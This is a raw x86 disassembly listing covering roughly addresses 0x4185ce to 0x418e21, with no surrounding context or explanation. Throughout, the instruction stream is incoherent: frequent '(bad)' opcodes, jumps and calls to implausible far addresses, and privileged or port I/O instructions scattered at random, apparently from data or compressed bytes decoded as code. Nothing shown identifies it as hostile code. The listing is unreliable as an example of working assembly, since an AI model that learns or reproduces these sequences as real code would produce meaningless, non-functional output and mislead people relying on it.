  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
